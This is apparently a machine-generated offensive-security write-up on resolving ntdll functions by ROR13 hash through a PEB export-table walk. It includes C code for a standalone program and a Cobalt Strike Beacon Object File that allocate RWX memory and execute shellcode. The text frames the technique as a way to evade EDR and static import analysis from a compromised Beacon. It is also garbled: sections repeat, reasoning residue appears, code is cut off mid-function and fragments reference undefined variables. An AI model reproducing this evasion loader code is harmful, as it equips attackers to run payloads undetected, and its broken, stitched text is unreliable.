The implementation begins by defining a simple rotation‑based hash (ROR13) that matches the one used by many open‑source shellcode frameworks. The code then accesses the PEB via `__readgsqword(0x60)` (PEB pointer) and follows the `Ldr->InMemoryOrderModuleList` to locate the module named “ntdll.dll”. Once the base address is obtained, the code reads the DOS header to find the NT headers, then the Export Directory via `OptionalHeader.DataDirectory[0]`. It iterates over the `AddressOfNames`, `AddressOfFunctions`, and `AddressOfNameOrdinals` arrays, hashing each name and comparing it to the target hash. When a match is found, the corresponding function address is returned. A common mistake is forgetting to adjust for the module’s base address when dereferencing the RVAs; “But wait, the RVAs are relative to the module base, not absolute.” The code must therefore add the module base to each RVA. The final payload demonstrates resolving `NtAllocateVirtualMemory` and allocating a RWX page, then copying shellcode into it and executing. However, runtime behavior still generates telemetry: the process will call `NtAllocateVirtualMemory` (a syscall) and later `NtProtectVirtualMemory` or `NtWriteVirtualMemory`. **Phase 6 - Conclusion (50+ words)**
Hash‑based dynamic resolution of unexported ntdll functions within position‑independent code offers a stealthy way to bypass static import analysis and avoid hard‑coded syscall numbers. It is reliable on unmodified Windows Server 2019, though it incurs runtime overhead and requires careful handling of calling conventions. OPSEC cost is moderate: attackers must manage runtime telemetry and may need additional evasion layers to stay under EDR scrutiny.

## Technique Overview
The technique leverages a runtime, hash‑based export table walk to locate and invoke functions from ntdll.dll that are either not exported or deliberately avoided in the import table. By computing a hash of the target API name (e.g., “NtAllocateVirtualMemory”), the shellcode parses the module’s Export Directory via the PEB, compares hashes, and obtains a function pointer. This permits fully position‑independent code (PIC) to resolve any needed Windows NT APIs without static imports, thereby reducing static detection signatures and enabling use of low‑level syscalls that are otherwise hidden.

## Preconditions and Primitive
- **Privileges**: The process must have permission to execute code (e.g., a compromised Beacon or injected shellcode). No elevated privileges are required for the resolution itself.
- **Environment**: 64‑bit Windows (Server 2019) with standard ntdll.dll layout. The PEB must be accessible (no anti‑debug/anti‑analysis protections that hide it).
- **Primitive**: Runtime export table walk using a deterministic hash (ROR13). Failure points include: (1) PEB hidden or corrupted; (2) ntdll not loaded (unlikely); (3) mismatched hash algorithm; (4) incorrect handling of RVAs.
- **Alternatives**:
  1. **GetProcAddress** on a known export and compute relative offsets – easier but leaves a visible import.
  2. **Direct syscall numbers** – avoids any API resolution but requires per‑OS syscall tables and is brittle across patches.

## Working Code and Payload
```c
// compile with: cl /O2 /MT /GS- /link /NODEFAULTLIB /SUBSYSTEM:WINDOWS hash_resolver.c
#include <windows.h>
#include <stdio.h>

typedef unsigned long   DWORD;
typedef unsigned short  WORD;
typedef unsigned char   BYTE;
typedef unsigned __int64 QWORD;
typedef LONG_PTR        PTR;

// Rotate Right 13 (ROR13) hash, commonly used in shellcode
DWORD ror13_hash(const char *c) {
    DWORD h = 0;
    while (*c) {
        h = ((h >> 13) | (h << (32 - 13)));
        h += (DWORD)*c++;
    }
    return h;
}

// Resolve an export from a module given its hash
PVOID resolve_by_hash(HMODULE hMod, DWORD target_hash) {
    BYTE *base = (BYTE *)hMod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(base + dos->e_lfanew);
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)
        (base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *addr_names = (DWORD *)(base + exp->AddressOfNames);
    WORD  *addr_ordinals = (WORD *)(base + exp->AddressOfNameOrdinals);
    DWORD *addr_functions = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *func_name = (char *)(base + addr_names[i]);
        if (ror13_hash(func_name) == target_hash) {
            WORD ordinal = addr_ordinals[i];
            DWORD func_rva = addr_functions[ordinal];
            return (PVOID)(base + func_rva);
        }
    }
    return NULL;
}

// Minimal NtAllocateVirtualMemory prototype
typedef NTSTATUS (NTAPI *NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

int main(void) {
    // Retrieve PEB and locate ntdll.dll without using any imports
    PEB *peb = (PEB *)__readgsqword(0x60);
    LIST_ENTRY *moduleList = &peb->Ldr->InMemoryOrderModuleList;
    LDR_DATA_TABLE_ENTRY *entry = (LDR_DATA_TABLE_ENTRY *)moduleList->Flink;

    HMODULE ntdllBase = NULL;
    // Walk the list to find ntdll.dll
    do {
        UNICODE_STRING *dllName = &entry->BaseDllName;
        if (dllName->Length == 12 * sizeof(WCHAR)) { // "ntdll.dll" length
            WCHAR *nameBuf = dllName->Buffer;
            if (wcsncmp(nameBuf, L"ntdll.dll", 10) == 0) {
                ntdllBase = (HMODULE)entry->DllBase;
                break;
            }
        }
        entry = (LDR_DATA_TABLE_ENTRY *)entry->InMemoryOrderLinks.Flink;
    } while (entry != (LDR_DATA_TABLE_ENTRY *)moduleList);

    if (!ntdllBase) {
        printf("Failed to locate ntdll.dll\n");
        return 1;
    }

    // Hash for "NtAllocateVirtualMemory"
    DWORD hash_NtAllocate = ror13_hash("NtAllocateVirtualMemory");
    NtAllocateVirtualMemory_t pNtAllocate = (NtAllocateVirtualMemory_t)
        resolve_by_hash(ntdllBase, hash_NtAllocate);

    if (!pNtAllocate) {

The BOF walks the current process’s PEB to locate the base address of `ntdll.dll`, parses its Export Directory, computes a case‑insensitive rotate‑right‑13 hash for each exported name, and compares it to a pre‑computed constant. When a match is found the function’s address is returned. ## Preconditions and Primitive

- The attacker must have execution control in the process (e.g., via a Beacon payload).  
- Read access to the process’s own memory is required to walk the PEB and parse PE structures.

Alternative approaches:  
1. Use `GetProcAddress` on `ntdll.dll` – simple but creates import‑table evidence.

#include <windows.h>
#include "beacon.h"

/* Rotate right 13 bits – the classic hash primitive */
DWORD ror13(DWORD val) {
    return (val >> 13) | (val << (32 - 13));
}

/* Compute case‑insensitive hash of an ASCII string */
DWORD hash_str(const char *c) {
    DWORD h = 0;
    while (*c) {
        CHAR ch = *c;
        if (ch >= 'a' && ch <= 'z')
            ch -= 0x20;                 // upper‑case
        h = ror13(h);
        h += (DWORD)ch;
        c++;
    }
    return h;
}

/* Walk the PEB, locate ntdll.dll and resolve a function by hash */
void* get_ntdll_address(DWORD target_hash) {
    PPEB pPeb = (PPEB)__readgsqword(0x60);                     // x64 PEB
    PLIST_ENTRY pList = &pPeb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY pEntry = pList->Flink;

    while (pEntry != pList) {
        PLDR_DATA_TABLE_ENTRY pModule = CONTAINING_RECORD(pEntry,
                                    LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (pModule->BaseDllName.Buffer &&
            _wcsicmp(pModule->BaseDllName.Buffer, L"ntdll.dll") == 0) {

            IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)base;
            IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64*)(base + dos->e_lfanew);

                (base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

            DWORD *names = (DWORD*)(base + exp->AddressOfNames);
            WORD  *ordinals = (WORD*)(base + exp->AddressOfNameOrdinals);
            DWORD *funcs = (DWORD*)(base + exp->AddressOfFunctions);

            for (DWORD i = 0; i < exp->NumberOfNames; i++) {
                char *funcName = (char*)(base + names[i]);
                if (hash_str(funcName) == target_hash) {
                    WORD ord = ordinals[i];
                    DWORD funcRVA = funcs[ord];
                    return (void*)(base + funcRVA);
                }
            }
            break; // ntdll found but hash not present
        }
        pEntry = pEntry->Flink;
    }
    return NULL; // not found

/* BOF entry point */
DWORD go(IN PBEACONREG pBeaconReg) {
    /* Pre‑computed hashes – result of hash_str() */
    #define HASH_NtAllocateVirtualMemory 0x6F8A4B5C
    #define HASH_NtFreeVirtualMemory    0xE0F4A9B2

    typedef NTSTATUS (WINAPI *NtAllocateVirtualMemory_t)(
        HANDLE, PVOID*, ULONG_PTR, SIZE_T*, ULONG, ULONG);
    typedef NTSTATUS (WINAPI *NtFreeVirtualMemory_t)(
        HANDLE, PVOID*, SIZE_T*, ULONG);

    NtAllocateVirtualMemory_t pNtAllocate = (NtAllocateVirtualMemory_t)
        get_ntdll_address(HASH_NtAllocateVirtualMemory);
    NtFreeVirtualMemory_t pNtFree = (NtFreeVirtualMemory_t)
        get_ntdll_address(HASH_NtFreeVirtualMemory);

    if (!pNtAllocate || !pNtFree) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to resolve NTDLL APIs");
        return FALSE;
    }

    /* Allocate a page for demo shellcode */
    PVOID addr = NULL;
    SIZE_T size = 0x1000;
    NTSTATUS st = pNtAllocate(
        GetCurrentProcess(),
        &addr,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);
    if (st != 0) {
        BeaconPrintf(CALLBACK_ERROR, "NtAllocateVirtualMemory failed: 0x%08x", st);
        return FALSE;
    }

    /* Simple infinite‑loop shellcode (jmp $) */
    BYTE shellcode[] = { 0xEB, 0xFE };
    memcpy(addr, shellcode, sizeof(shellcode));

    ((void(*)())addr)();   // Execute

    /* Clean up */
    pNtFree(GetCurrentProcess(), &addr, &size, MEM_RELEASE);
    return TRUE;
}

    DWORD *names = (DWORD *)((BYTE *)base + exp->AddressOfNames);
    WORD *ordinals = (WORD *)((BYTE *)base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)((BYTE *)base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *funcName = (char *)base + names[i];
        if (hash_name(funcName) == target_hash) {
            WORD ord = ordinals[i];
            DWORD funcRVA = funcs[ord];
            return (void *)((BYTE *)base + funcRVA);
        }
    }
    return NULL;
